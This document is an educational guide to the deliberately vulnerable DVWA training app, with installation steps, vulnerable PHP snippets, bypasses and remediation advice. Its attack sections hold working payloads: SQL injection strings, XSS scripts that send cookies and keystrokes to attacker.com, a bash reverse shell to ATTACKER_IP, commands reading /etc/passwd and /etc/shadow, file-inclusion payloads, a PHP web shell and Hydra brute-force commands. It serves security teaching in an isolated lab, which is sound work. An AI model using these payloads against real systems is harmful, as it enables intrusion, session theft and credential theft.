# DVWA - Damn Vulnerable Web Application

## Complete Educational Guide for Cybersecurity Students

---

## 1. Introduction and Overview

Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is intentionally designed to be vulnerable. Created by the Digininja project, DVWA serves as one of the most widely used training platforms for learning web application security concepts in a safe, legal, and controlled environment.

DVWA is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications, and to aid both students and teachers to learn about web application security in a controlled classroom environment.

**Key Facts:**
- **Author:** Digininja (Robin Wood)
- **License:** GPL v3
- **Language:** PHP (88.9%), JavaScript (5.2%), Hack (3.3%), CSS (1.6%)
- **Database:** MariaDB/MySQL (with optional SQLite3 support)
- **GitHub Stars:** 13,400+
- **Latest Release:** v2.5 (January 2025)

### 1.1 Why Use DVWA?

DVWA provides an invaluable platform for:

- **Security Professionals:** Testing their skills and tools in a legal environment
- **Web Developers:** Understanding common vulnerabilities and how to prevent them
- **Students:** Learning about web application security hands-on
- **Teachers:** Creating controlled classroom exercises
- **Tool Testing:** Trying out automated scanners and security tools

### 1.2 Legal and Ethical Considerations

**WARNING:** DVWA is intentionally vulnerable. Never upload it to any internet-facing server. Always run it in an isolated environment such as a virtual machine (VirtualBox or VMware) with NAT networking.

**Disclaimer:** The DVWA project takes no responsibility for how anyone uses this application. It should never be used maliciously. Always obtain proper authorization before testing any system.

---

## 2. Architecture

### 2.1 Technology Stack

| Component | Technology |
|-----------|------------|
| Frontend | HTML, CSS, JavaScript |
| Backend | PHP 7.3+ (PHP 8.x recommended) |
| Database | MariaDB (recommended) / MySQL |
| Web Server | Apache2 / Nginx |
| Containerization | Docker with Docker Compose |

### 2.2 Directory Structure

```
DVWA/
├── config/                 # Configuration files
│   └── config.inc.php.dist # Default config template
├── database/               # Database setup scripts
├── dvwa/                   # Main application code
│   └── includes/           # PHP include files
├── hackable/               # Hackable content
│   └── uploads/            # Upload directory (must be writable)
├── vulnerabilities/        # Vulnerability modules
│   ├── brute/              # Brute Force
│   ├── csrf/               # CSRF
│   ├── exec/               # Command Execution
│   ├── file_inclusion/     # File Inclusion
│   ├── upload/             # File Upload
│   ├── sqli/               # SQL Injection
│   ├── sqli_blind/         # Blind SQL Injection
│   ├── xss_r/              # Reflected XSS
│   ├── xss_s/              # Stored XSS
│   └── captcha/            # Insecure CAPTCHA
├── tests/                  # Test scripts
├── Dockerfile              # Docker build file
├── compose.yml             # Docker Compose configuration
├── index.php               # Main entry point
├── login.php               # Login page
└── setup.php               # Database setup page
```

### 2.3 Security Levels

DVWA features four security levels that change how each vulnerability module behaves:

| Level | Description | Code Behavior |
|-------|-------------|---------------|
| **Low** | No security measures | Vulnerable code with minimal filtering |
| **Medium** | Basic protections | Simple input validation/sanitization |
| **High** | More advanced protections | Token-based, stricter filtering |
| **Impossible** | Secure implementation | Proper security measures applied |

---

## 3. Installation

### 3.1 Method 1: Kali Linux Package (Recommended for Kali)

```bash
# Install DVWA via apt
sudo apt update
sudo apt install dvwa

# Start the DVWA service
sudo dvwa-start

# Access at http://127.0.0.1:42001
```

### 3.2 Method 2: Docker Installation

```bash
# Clone the repository
git clone https://github.com/digininja/DVWA.git
cd DVWA

# Copy config file
cp config/config.inc.php.dist config/config.inc.php

# Start with Docker Compose
docker compose up -d

# Access at http://localhost:4280
```

### 3.3 Method 3: Manual Installation on Linux

```bash
# Update package list
sudo apt update

# Install required packages
sudo apt install -y apache2 mariadb-server mariadb-client \
    php php-mysqli php-gd libapache2-mod-php

# Enable Apache rewrite module
sudo a2enmod rewrite

# Clone DVWA
sudo git clone https://github.com/digininja/DVWA.git /var/www/html/DVWA

# Set permissions
sudo chmod -R 777 /var/www/html/DVWA/hackable/uploads/

# Create config file
sudo cp /var/www/html/DVWA/config/config.inc.php.dist \
    /var/www/html/DVWA/config/config.inc.php

# Restart Apache
sudo systemctl restart apache2
```

### 3.4 Method 4: Automated Installation Script

```bash
# Download the automated installer
wget https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh

# Make executable and run
chmod +x Install-DVWA.sh
sudo ./Install-DVWA.sh
```

### 3.5 Docker Compose Configuration

The default `compose.yml` file configures:

```yaml
services:
  web:
    image: dvwa
    ports:
      - "127.0.0.1:4280:80"
    restart: unless-stopped
    depends_on:
      - db
    environment:
      - DB_SERVER=db
      - DEFAULT_SECURITY_LEVEL=low
  db:
    image: mariadb:latest
    environment:
      - MYSQL_ROOT_PASSWORD=dvwa-root-pw
      - MYSQL_DATABASE=dvwa
      - MYSQL_USER=dvwa
      - MYSQL_PASSWORD=p@ssw0rd
    volumes:
      - dvwa:/var/lib/mysql
volumes:
  dvwa:
```

---

## 4. Configuration

### 4.1 Configuration File

The main configuration file is `config/config.inc.php`. Key settings:

```php
<?php
// Database server
$_DVWA['db_server']   = '127.0.0.1';
$_DVWA['db_port']     = '3306';
$_DVWA['db_user']     = 'dvwa';
$_DVWA['db_password'] = 'p@ssw0rd';
$_DVWA['db_database'] = 'dvwa';

// reCAPTCHA keys (for Insecure CAPTCHA lab)
$_DVWA['recaptcha_public_key']  = '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';
$_DVWA['recaptcha_private_key'] = '6LdK7xITAzzAAL_uj9WO1CJSIQtaM1GcmRnmhCDR';

// Default security level
$_DVWA['default_security_level'] = 'low';

// Disable authentication (for automated testing)
$_DVWA['disable_authentication'] = false;
```

### 4.2 Environment Variables Configuration

Instead of modifying the config file, you can set environment variables in Docker:

```yaml
environment:
  - DB_SERVER=db
  - DEFAULT_SECURITY_LEVEL=low
  - DISABLE_AUTHENTICATION=false
```

### 4.3 Database Setup

1. Navigate to `http://localhost:4280/setup.php`
2. Click "Create / Reset Database"
3. The script creates all required tables and sample data

**Manual Database Setup (if needed):**

```sql
-- Connect to MariaDB
mysql -u root -p

-- Create database and user
CREATE DATABASE dvwa;
CREATE USER dvwa@localhost IDENTIFIED BY 'p@ssw0rd';
GRANT ALL ON dvwa.* TO dvwa@localhost;
FLUSH PRIVILEGES;
```

### 4.4 PHP Configuration

For full functionality, ensure these settings in `php.ini`:

```ini
allow_url_include = On
allow_url_fopen = On
display_errors = On
display_startup_errors = On
```

### 4.5 Default Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | password | Administrator |
| gordonb | abc123 | User |
| 1337 | charley | User |
| pablo | letmein | User |
| smithy | password | User |

**Login URL:** `http://127.0.0.1/login.php`

---

## 5. Security Levels Explained

### 5.1 Low Security Level

At the Low security level, DVWA implements virtually no input validation or sanitization. This makes it straightforward to exploit vulnerabilities.

**Characteristics:**
- No input filtering or validation
- Direct database queries without parameterization
- No CSRF tokens
- No file type validation
- No rate limiting on authentication

### 5.2 Medium Security Level

The Medium level introduces basic security measures that can often be bypassed with slightly more advanced techniques.

**Characteristics:**
- Basic input validation (often client-side or incomplete)
- Simple string replacement for common attacks
- Basic file extension checking
- Basic session management

### 5.3 High Security Level

The High level implements more robust security measures that require deeper understanding to bypass.

**Characteristics:**
- More thorough input validation
- Token-based CSRF protection
- Stricter file type validation
- More complex filtering patterns

### 5.4 Impossible Security Level

The Impossible level represents how each vulnerability should be properly secured. Study this level to learn proper defensive coding.

**Characteristics:**
- Parameterized queries (prepared statements)
- Proper CSRF token validation
- Content Security Policy headers
- Strong file upload validation
- Account lockout mechanisms

---

## 6. SQL Injection

### 6.1 What is SQL Injection?

SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered or not strongly typed and is not properly parameterized.

### 6.2 SQL Injection - Low Security

**Vulnerable Code (sqli/source/low.php):**

```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    $id = $_REQUEST[ 'id' ];
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query)
        or die('<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>');
    // ... display results
}
?>
```

**Attack Payloads:**

```
# Extract all users
' OR '1'='1

# Union-based injection
' UNION SELECT user, password FROM users--

# Extract database version
' UNION SELECT version(), NULL--

# Extract table names
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--

# Extract column names
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

### 6.3 SQL Injection - Medium Security

**Protection:** Uses `mysqli_real_escape_string()` and forces integer input via `(int)`.

```php
$id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ?
    mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_REQUEST["id"]) :
    ((trigger_error("[MySQLConverterToo] ...", E_USER_ERROR)) ? "" : ""));
$id = (integer)$id;
```

**Bypass:** The `(int)` cast makes it harder but a simple integer-based injection works:

```
1 UNION SELECT user, password FROM users--
```

### 6.4 SQL Injection - High Security

**Protection:** Uses a `LIMIT 1` clause and MySQL-specific escaping.

```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

**Bypass:** Comment out the LIMIT clause:

```
' UNION SELECT user, password FROM users-- -
```

### 6.5 SQL Injection - Impossible Security

**Protection:** Uses prepared statements with parameterized queries.

```php
$data = $db->prepare("SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;");
$data->bindParam(':id', $id, PDO::PARAM_INT);
$data->execute();
```

### 6.6 Blind SQL Injection

Blind SQL Injection doesn't return data directly but can be exploited through:

**Boolean-based:**

```sql
' AND (SELECT SUBSTRING(user_id,1,1) FROM users WHERE user_id=1)='1'--
```

**Time-based:**

```sql
' AND IF(SUBSTRING(user_id,1,1)='1', SLEEP(5), 0)--
```

### 6.7 Using sqlmap with DVWA

```bash
# Set up cookie from browser (login first)
# Then run sqlmap:
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=your_session_id; security=low" \
    --dbs

# Dump all tables from dvwa database
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=your_session_id; security=low" \
    -D dvwa --dump-all

# For POST-based injection:
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/" \
    --data="id=1&Submit=Submit" \
    --cookie="PHPSESSID=your_session_id; security=low" \
    --dbs
```

---

## 7. Cross-Site Scripting (XSS)

### 7.1 Reflected XSS

**Low Security - Vulnerable Code:**

```php
<?php
header ("X-XSS-Protection: 0");
$name = $_REQUEST["name"];
echo "<div>Welcome back " . $name . "</div>";
?>
```

**Attack Payloads:**

```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Image tag -->
<img src=x onerror=alert('XSS')>

<!-- SVG -->
<svg onload=alert('XSS')>

<!-- Event handler -->
<body onload=alert('XSS')>

<!-- Cookie stealing -->
<script>new Image().src="http://attacker.com/steal.php?c="+document.cookie;</script>

<!-- Keyboard logger -->
<script>
document.onkeypress=function(e){
    new Image().src="http://attacker.com/log?key="+e.key;
}
</script>
```

**Medium Security Bypass:**

```html
<!-- The medium level strips <script> tags -->
<script>alert('XSS')</script>  <!-- Blocked -->

<!-- But doesn't filter: -->
<scr<script>ipt>alert('XSS')</script>  <!-- Bypasses strip_tags -->

<!-- Or use: -->
<ImG sRc=x oNeRrOr=alert('XSS')>
```

### 7.2 Stored XSS

**Low Security - Vulnerable Code:**

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // No sanitization - directly inserted into database
    $query = "INSERT INTO guestbook (comment, name) VALUES ('$message', '$name');";
    mysqli_query($GLOBALS["___mysqli_ston"], $query);
}
?>
```

**Attack:** The XSS payload is stored in the database and displayed to every user who views the guestbook.

```html
<script>
// Steal cookies and send to attacker
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

// Deface the page
<script>document.body.innerHTML = '<h1>Hacked!</h1>'</script>

// Keylogger
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

### 7.3 DOM-Based XSS

DOM-based XSS occurs when the application processes data from an untrusted source through safe DOM APIs.

```javascript
// Vulnerable code
document.getElementById("output").innerHTML = location.hash.substring(1);

// Attack URL
http://dvwa/vulnerabilities/xss_d/#<script>alert('XSS')</script>
```

---

## 8. Cross-Site Request Forgery (CSRF)

### 8.1 How CSRF Works

CSRF forces an authenticated user to execute unwanted actions on a web application they're logged into.

### 8.2 CSRF - Low Security

**Vulnerable Code:**

```php
<?php
if( isset( $_GET[ 'Change' ] ) ) {
    $pass_new  = $_GET[ "password_new" ];
    $pass_conf = $_GET[ "password_conf" ];
    if( $pass_new == $pass_conf ) {
        $query = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        mysqli_query($GLOBALS["___mysqli_ston"], $query);
    }
}
?>
```

**Attack - Malicious URL:**

```
http://127.0.0.1/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

**Attack - HTML Image Tag:**

```html
<img src="http://127.0.0.1/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
     style="display:none">
```

**Attack - Auto-submitting Form:**

```html
<body onload="document.getElementById('csrf-form').submit();">
<form id="csrf-form"
      action="http://127.0.0.1/vulnerabilities/csrf/"
      method="GET">
    <input type="hidden" name="password_new" value="hacked">
    <input type="hidden" name="password_conf" value="hacked">
    <input type="hidden" name="Change" value="Change">
</form>
</body>
```

### 8.3 CSRF - High Security

Uses a token for verification:

```
http://127.0.0.1/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&token=abc123
```

The token must be extracted first (e.g., via XSS) before the CSRF attack can work.

---

## 9. Command Injection

### 9.1 Low Security

**Vulnerable Code:**

```php
<?php
$target = $_REQUEST[ 'ip' ];
$cmd    = shell_exec( 'ping  -c 4 ' . $target );
echo "<pre>{$cmd}</pre>";
?>
```

**Attack Payloads:**

```bash
# Basic injection
127.0.0.1; cat /etc/passwd

# Reverse shell
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Read files
127.0.0.1; cat /etc/shadow

# Execute commands
127.0.0.1; id && whoami && uname -a

# Using backticks
127.0.0.1 `id`

# Using pipe
127.0.0.1 | ls -la

# Using $()
127.0.0.1 $(whoami)

# Multi-line injection
127.0.0.1%0aid%0auname%20-a
```

### 9.2 Medium Security

**Protection:** Removes `&&` and `;` characters.

```php
$substitutions = array(
    '&&' => '',
    ';'  => '',
);
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```

**Bypass:**

```bash
# Use pipe instead
127.0.0.1 | cat /etc/passwd

# Use newlines (URL encoded)
127.0.0.1%0acat /etc/passwd

# Double piping
|| cat /etc/passwd
```

### 9.3 High Security

**Protection:** Removes more characters including `|`, `&`, `-`, `;`.

```php
$characters = array( ' ', '&', ';', '|', '-', '$', '(', ')', '<', '>', '==' );
$target = str_replace( $characters, '', $target );
```

**Bypass:**

```bash
# Use backticks with newlines
%0a`cat /etc/passwd`%0a
```

---

## 10. File Inclusion

### 10.1 Local File Inclusion (LFI)

**Low Security - Vulnerable Code:**

```php
<?php
$file = $_GET[ "page" ];
include( $file );
?>
```

**Attack Payloads:**

```bash
# Read /etc/passwd
?page=../../../../../../../etc/passwd

# Read Apache config
?page=../../../../../../../etc/apache2/apache2.conf

# Read PHP config
?page=../../../../../../../etc/php/8.2/apache2/php.ini

# Null byte injection (PHP < 5.3.4)
?page=../../../../../../../etc/passwd%00

# Path truncation
?page=../../../../../../../etc/passwd.....
```

### 10.2 Remote File Inclusion (RFI)

**Requirements:** `allow_url_include = On` and `allow_url_fopen = On` in php.ini.

```bash
# Include remote file
?page=http://attacker.com/shell.txt

# PHP wrapper
?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd

# Data URI
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+

# PHP wrapper for code execution
?page=php://input
POST data: <?php system($_GET['c']); ?>
```

### 10.3 File Inclusion with Path Traversal

```bash
# Using null bytes
../../../../etc/passwd%00

# Using double encoding
..%252f..%252f..%252f..%252fetc/passwd

# Using PHP wrappers
php://filter/convert.base64-encode/resource=../../config/config.inc.php
```

---

## 11. File Upload

### 11.1 Low Security

**Vulnerable Code:**

```php
<?php
$target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/" . basename( $_FILES['uploaded']['name'] );
if( move_uploaded_file( $_FILES['uploaded']['tmp_name'], $target_path ) ) {
    echo "<pre>{$target_path} successfully uploaded!</pre>";
} else {
    echo "<pre>Your image was not uploaded.</pre>";
}
?>
```

**Attack - Upload PHP Shell:**

```php
// Save as shell.php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```

**Access the shell:**

```bash
curl "http://127.0.0.1/hackable/uploads/shell.php?cmd=id"
```

### 11.2 Medium Security

**Protection:** Checks file MIME type and extension.

```php
if( (filetype( $target_path ) == "image/jpeg" || filetype( $target_path ) == "image/png") &&
    (filesize( $target_path ) < 100000) ) {
    // Upload allowed
}
```

**Bypass:**

- Change the Content-Type header in the HTTP request from `application/x-php` to `image/jpeg`
- Use a null byte: `shell.php.jpg`
- Use double extension: `shell.php.png`

### 11.3 High Security

**Protection:** Renames file and checks extension against allowlist.

```php
$target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/" . md5( $_FILES['uploaded']['name'] ) . "_" . date( "YmdHis" ) . "." . $parts[1];
```

**Bypass:** Upload `.php.jpg.php` or use `.phtml`, `.php5`, `.phps` extensions.

### 11.4 Impossible Security

**Protection:** Random filename, Content-Type verification, and image reprocessing.

```php
$target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/" . md5( $_FILES['uploaded']['name'] ) . "." . $ext;
```

---

## 12. Brute Force

### 12.1 Low Security

**Vulnerable Code:**

```php
<?php
if( isset( $_POST[ 'Login' ] ) ) {
    $user = $_POST[ 'username' ];
    $pass = $_POST[ 'password' ];
    $pass = md5( $pass );
    $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    // ... check if user exists
}
?>
```

**Attack with Hydra:**

```bash
# Basic brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    127.0.0.1 http-post-form \
    "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed"

# For medium/high security, include cookies:
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    127.0.0.1 http-post-form \
    "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed:PHPSESSID=your_session_id;security=low"
```

**Attack with Burp Suite:**

1. Capture the login request in Burp
2. Send to Intruder
3. Set the payload position on the password field
4. Load a password list
5. Start the attack

### 12.2 Low Security - Rate Limiting

There is no rate limiting at the Low level, making brute force attacks trivial.

### 12.3 Medium Security

**Protection:** Adds a 2-second sleep on failed login.

```php
sleep( 2 );
echo "<pre><br />Username and/or password incorrect.</pre>";
```

**Impact:** Slows down brute force but doesn't prevent it.

### 12.4 High Security

**Protection:** Adds a 5-second sleep and CAPTCHA.

**Impact:** Significantly slower but still possible with enough time and patience.

---

## 13. Insecure CAPTCHA

### 13.1 Overview

The Insecure CAPTCHA module demonstrates flaws in CAPTCHA implementations.

### 13.2 Low Security

**Vulnerability:** CAPTCHA is only validated on the first step, not the second.

```php
// Step 1: CAPTCHA validated
if( isset( $_POST[ 'Step Two' ] ) ) {
    // CAPTCHA check here
}

// Step 2: Password change - no CAPTCHA!
if( isset( $_POST[ 'Change' ] ) ) {
    // Change password without CAPTCHA
}
```

**Attack:** Skip the CAPTCHA by sending Step 2 directly.

### 13.3 Medium Security

**Vulnerability:** CAPTCHA validation can be bypassed through client-side manipulation.

### 13.4 High Security

Uses reCAPTCHA but has a bypass in the server-side logic.

---

## 14. Integration with Other Tools

### 14.1 sqlmap

```bash
# Automated SQL injection testing
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=abc123; security=low" \
    --batch --dbs

# With Tamper scripts
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=abc123; security=low" \
    --tamper=space2comment --batch
```

### 14.2 Burp Suite

1. Configure proxy: `127.0.0.1:8080`
2. Browse to DVWA through Burp
3. Use various Burp tools:
   - **Repeater:** Manual request manipulation
   - **Intruder:** Automated attacks
   - **Scanner:** Vulnerability scanning
   - **Decoder:** Encoding/decoding payloads

### 14.3 Metasploit

```bash
# Using auxiliary modules
msfconsole
use auxiliary/scanner/http/dvwa_login
set RHOSTS 127.0.0.1
set USERNAME admin
set PASSWORD password
run
```

### 14.4 Nikto

```bash
nikto -h 127.0.0.1
nikto -h 127.0.0.1 -p 4280
```

---

## 15. Lab Exercises

### Exercise 1: SQL Injection Discovery

**Objective:** Identify and exploit a SQL injection vulnerability.

1. Navigate to SQL Injection module
2. Test with a single quote: `'`
3. Identify error messages
4. Use UNION SELECT to extract data
5. Document all findings

### Exercise 2: XSS Attack Chain

**Objective:** Chain Reflected XSS with Stored XSS.

1. Create a Stored XSS payload in the guestbook
2. Craft a Reflected XSS that reads the stored payload
3. Demonstrate cookie theft scenario

### Exercise 3: Command Injection to Shell

**Objective:** Achieve remote code execution.

1. Identify the command injection point
2. Test with simple commands
3. Upload a web shell
4. Execute system commands

### Exercise 4: Authentication Bypass

**Objective:** Bypass authentication mechanisms.

1. Analyze the brute force module
2. Identify authentication flaws
3. Use Hydra to brute force credentials
4. Document the approach

### Exercise 5: File Inclusion Exploitation

**Objective:** Achieve code execution through file inclusion.

1. Identify the file inclusion vulnerability
2. Test with PHP wrappers
3. Use `php://filter` to read source code
4. Achieve code execution via `php://input`

---

## 16. Remediation Guidance

### 16.1 SQL Injection Prevention

```php
// BAD - Vulnerable
$query = "SELECT * FROM users WHERE id = '$id'";

// GOOD - Prepared Statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $id]);
```

### 16.2 XSS Prevention

```php
// BAD - Vulnerable
echo $_GET['name'];

// GOOD - Output Encoding
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

### 16.3 CSRF Prevention

```php
// Generate token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Validate token
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token validation failed');
}
```

### 16.4 Command Injection Prevention

```php
// BAD - Vulnerable
$output = shell_exec("ping -c 4 " . $user_input);

// GOOD - Use built-in functions
$output = shell_exec("ping -c 4 " . escapeshellarg($user_input));
```

### 16.5 File Upload Prevention

```php
// Validate file type properly
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);

$allowed = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed)) {
    die('Invalid file type');
}
```

---

## 17. Troubleshooting

### Common Issues

**Problem:** "Access denied" when running setup

```bash
# Test database connection
mysql -u dvwa -pp@ssw0rd -D dvwa

# If it works, check config file
cat config/config.inc.php
```

**Problem:** "Connection refused"

```bash
# Check MariaDB status
sudo systemctl status mariadb

# Start if not running
sudo systemctl start mariadb
```

**Problem:** Blank page

```bash
# Enable error display in php.ini
display_errors = On
display_startup_errors = On

# Restart Apache
sudo systemctl restart apache2
```

**Problem:** Docker won't start

```bash
# Check Docker logs
docker compose logs

# Rebuild container
docker compose down
docker compose up -d --build
```

**Problem:** File upload not working

```bash
# Check permissions
ls -la hackable/uploads/

# Set write permissions
chmod -R 777 hackable/uploads/
```

---

## 18. Best Practices

1. **Start with Low Security:** Begin with Low level to understand the basic vulnerabilities
2. **Study Impossible Code:** Always review the Impossible level to learn proper security
3. **Use Multiple Tools:** Practice with sqlmap, Burp Suite, and manual techniques
4. **Document Everything:** Keep notes of all payloads and techniques that work
5. **Progress Gradually:** Move to Medium, High, then Impossible levels
6. **Practice Regularly:** Repeat exercises to reinforce learning
7. **Stay Updated:** Keep DVWA updated to the latest version
8. **Isolate Your Lab:** Never run DVWA on a production or internet-facing system

---

## References

- [DVWA GitHub Repository](https://github.com/digininja/DVWA)
- [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
- [Kali Linux DVWA Package](https://www.kali.org/tools/dvwa/)
- [Pwning OWASP Juice Shop](https://pwning.owasp-juice.shop/)
- [Web Application Hacker's Handbook](https://www.wiley.com/en-us/Web+Application+Hacker%27s+Handbook-p-9781118026472)
